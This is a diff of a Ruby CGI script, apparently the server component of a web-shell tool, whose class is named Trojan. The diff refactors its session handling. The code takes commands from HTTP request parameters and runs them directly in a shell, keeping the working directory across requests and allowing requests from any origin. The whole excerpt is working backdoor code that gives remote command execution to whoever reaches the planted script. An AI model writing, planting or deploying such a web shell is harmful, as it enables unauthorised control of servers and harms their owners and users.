@@ -5,18 +5,24 @@ require 'cgi/session/pstore'
 require 'json'
 
 class Trojan
-    attr_accessor :cwd, :response
+    attr_accessor :cgi, :cwd, :response, :session
 
-    def initialize
+    def initialize params
+        # store the session and cgi objects
+        @cgi      = params[:cgi]
+        @session  = params[:session]
+
         # emulate cwd persistence
-        @cwd = ($session[:cwd].nil?) ? `pwd`.strip! : $session[:cwd]
+        @cwd      = (@session[:cwd].nil?) ? `pwd`.strip! : @session[:cwd]
 
         # vivify the response object
         @response = {};
         @response['prompt_context'] = self.get_prompt_context
     end
 
-    def process_command(json)
+    def process_command()
+        json = @cgi.params
+
         # if the specified action was 'shell', pipe the command directly into
         # the web shell.
         if json['action'].first.eql? 'shell'
@@ -38,12 +44,12 @@ class Trojan
             'prompt_context' => self.get_prompt_context,
         }
 
-        $session[:cwd] = @cwd
+        @session[:cwd] = @cwd
         self.send_response
     end
 
     def send_response
-        #header('Access-Control-Allow-Origin: *')
+        puts @cgi.header('Access-Control-Allow-Origin: *')
         puts @response.to_json
         exit
     end
@@ -66,19 +72,20 @@ class Trojan
 end
 
 # ---------- Procedural code starts here ----------
-cgi      = CGI.new
-$session = CGI::Session.new(
+cgi     = CGI.new
+session = CGI::Session.new(
     cgi,
     'database_manager' => CGI::Session::PStore,
     'session_key'      => 'wash',
     'session_expires'  => Time.now + 30 * 60,
     'prefix'           => 'wash_pstore_sid_'
 )
-trojan   = Trojan.new
+trojan = Trojan.new({
+    :cgi     => cgi, 
+    :session => session, 
+})
 
-# can I move this?
-puts cgi.header('Access-Control-Allow-Origin: *')
-trojan.process_command cgi.params
+trojan.process_command
 
 # save session data
-$session.close
+session.close
